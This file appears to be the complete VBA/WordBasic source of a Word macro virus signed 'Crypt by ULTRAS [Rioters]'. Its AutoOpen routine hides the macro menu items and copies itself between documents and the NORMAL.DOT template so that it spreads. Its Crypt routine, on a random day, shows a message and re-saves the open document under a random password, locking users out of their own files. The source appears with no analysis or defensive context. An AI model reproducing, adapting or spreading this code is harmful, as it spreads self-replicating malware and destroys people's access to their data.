   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim D$
   On Error GoTo -1: On Error GoTo ULTRAS
   DeT
   WordBasic.DisableAutoMacros 0
   D$ = LCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
   If D$ = "NORMAL.DOT" Then
   If UD = 1 Then
   GoTo ULTRAS
   Else
   IND
   End If
   Else
   If FG = 1 Then
   GoTo ULTRAS
   Else
   ING
   End If
   End If
   ULTRAS:
   WordBasic.Call "Diablo"
   End Sub
   Private Function UD()
   Dim i
   UD = 0
   If WordBasic.CountMacros(1) > 0 Then
   For i = 1 To WordBasic.CountMacros(1)
   If WordBasic.[MacroName$](i, 1) = "Crypt" Then
   UD = 1
   End If
   Next i
   End If
   End Function
   Private Function FG()
   Dim i
   FG = 0
   If WordBasic.CountMacros(0) > 0 Then
   For i = 1 To WordBasic.CountMacros(0)
   If WordBasic.[MacroName$](i, 0) = "Crypt" Then
   FG = 1
   End If
   Next i
   End If
   End Function
   Private Sub DeT()
   Dim Q
   Dim U
   Dim g$
   Dim p
   Dim B$
   Dim T
   For Q = 0 To 1
   If Q Then U = 1 Else U = 6
   g$ = WordBasic.[MenuText$](Q, U)
   U = WordBasic.CountMenuItems(g$, Q) - 1
   For p = U To 1 Step -1
   If InStr(WordBasic.[MenuItemMacro$](g$, Q, p), "Macro") Then
   If Q Then
   B$ = WordBasic.[MenuItemMacro$](g$, Q, p - 2)
   Else
   p = p + 1
   End If
   For T = p To p - 1 Step -1
   If T > 3 Then WordBasic.ToolsCustomizeMenus MenuType:=Q, Position:=T, Name:=WordBasic.[MenuItemMacro$](g$, Q, T), Menu:=g$, Remove:=1, Context:=0
   Next
   p = 1
   T = 0
   End If
   Next
   Next
   End Sub
   Private Sub IND()
   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
   WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoOpen"
   WordBasic.MacroCopy "Global:ToolsMacro", WordBasic.[FileName$]() + ":Crypt"
   WordBasic.MacroCopy "Global:FileTemplates", WordBasic.[FileName$]() + ":Crypt"
   WordBasic.MacroCopy "Global:Crypt", WordBasic.[FileName$]() + ":Crypt"
   WordBasic.FileSaveAll 1, 1
   End Sub
   Private Sub ING()
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoClose"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":Crypt", "Global:ToolsMacro"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":Crypt", "Global:FileTemplates"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":Crypt", "Global:Crypt"
   WordBasic.FileSaveAll 1, 0
   End Sub

   Attribute VB_Name = "Crypt"

   Public Sub MAIN()
   Dim U
   Dim p
   Dim g
   Dim num
   On Error GoTo -1: On Error GoTo LiVe
   WordBasic.DisableAutoMacros 0
   U = WordBasic.Int(Rnd() * 30) + 1
   If WordBasic.Day(WordBasic.Now()) = U Then
   WordBasic.MsgBox "Crypt by ULTRAS [Rioters]", ("ULTRAS"), 16
   p = 1000
   g = 50
   num = WordBasic.Int(Rnd() * (p - g) * g)
   WordBasic.FileSaveAs Password:=Str(num)
   End If
   LiVe:
   End Sub
